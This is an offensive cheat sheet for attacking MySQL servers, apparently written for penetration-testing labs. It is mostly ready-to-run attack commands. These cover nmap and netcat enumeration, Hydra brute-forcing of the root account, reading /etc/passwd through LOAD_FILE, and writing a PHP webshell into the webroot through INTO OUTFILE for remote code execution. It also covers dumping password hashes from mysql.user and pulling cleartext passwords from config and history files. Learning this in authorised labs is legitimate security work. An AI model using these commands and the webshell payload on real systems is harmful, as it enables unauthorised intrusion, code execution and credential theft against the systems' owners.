# MySQL
**Default Port:** 3306 (TCP) 
**Key Insight:** MySQL is less prone to direct RCE than MSSQL, but **Arbitrary File Read/Write** is common if permissions are weak. Always check `secure_file_priv`.
## 1. Discovery & Enumeration
**Goal:** Identify version, open access, and script vulnerabilities.
### Nmap (Scripts)
**Syntax:** `nmap -p 3306 --script mysql* <IP>`
```shell
# Checks for empty passwords, valid users, and vulnerabilities
# ⚠️ OPSEC: Moderate Noise.
nmap -p 3306 -sV -sC --script="mysql-info,mysql-empty-password,mysql-users,mysql-databases,mysql-variables" 10.129.20.13
```
### Banner Grabbing (Netcat)
```shell
# Rapid version check
nc -nv 10.129.20.13 3306
```
## 2. Authentication & Connection
**Goal:** Connect to the database.
### Manual Connection (CLI)
**Syntax:** `mysql -u <User> -p<Password> -h <Host>` 
**Note:** There is **NO SPACE** between `-p` and the password.
```shell
# Connect with password prompt (Safer for history)
mysql -u root -h 10.129.20.13 -p

# Connect providing password inline
mysql -u root -pPassword123 -h 10.129.20.13
```
### Hydra (Brute Force)
**Target:** `root`, `admin`, `guest`.
```shell
# Brute force 'root' user
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.129.20.13
```
## 3. Internal Enumeration (SQL Syntax)
**Context:** You are connected to the DB.

| **Command**             | **Description**                               |
| ------------------- | ----------------------------------------- |
| `SHOW DATABASES;`   | List all databases.                       |
| `USE <db>;`         | Switch context to specific DB.            |
| `SHOW TABLES;`      | List tables in current DB.                |
| `DESCRIBE <table>;` | Show columns/types.                       |
| `SELECT version();` | Display version (Important for exploits). |
| `SELECT user();`    | Display current user (Check privileges).  |
```sql
-- Dump all data from a table
SELECT * FROM specific_table;
```
## 4. Attacks: Arbitrary File Read (LFI)
**Goal:** Read sensitive system files (SSH keys, `/etc/passwd`). 
**Requirement:** `FILE` privilege.
```sql
-- Read /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- Read Windows config
SELECT LOAD_FILE('c:/windows/win.ini');
```
## 5. Attacks: File Write (WebShell / RCE)
**Goal:** Write a PHP shell to the webroot to gain remote code execution. **Requirement:**
1. `FILE` privilege. 
2. `secure_file_priv` must be **empty** (or contain the target path).
3. Write access to the destination folder.
### Step 1: Check Permissions
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
-- If NULL: Import/Export is disabled. (Attack Fails)
-- If /var/lib/mysql-files/: Restricted to that folder.
-- If EMPTY (""): You can write ANYWHERE. (Vulnerable)
```
### Step 2: Write Webshell
```sql
-- Write PHP shell to webroot
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
```
## 6. Attacks: Hash Dumping
**Goal:** Extract hashes for offline cracking (Hashcat Mode 300).
```sql
-- MySQL 5.7+ (Modern)
SELECT user, authentication_string FROM mysql.user;

-- Older Versions
SELECT user, password FROM mysql.user;
```
## 7. Post-Exploitation (Local)
**Context:** You have shell access to the server.
```shell
# 1. Configuration Files (Find passwords/paths)
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#"
cat /etc/mysql/my.cnf

# 2. History File (CRITICAL)
# Often contains cleartext passwords typed by admins in the CLI.
cat ~/.mysql_history
grep -i "pass" ~/.mysql_history
```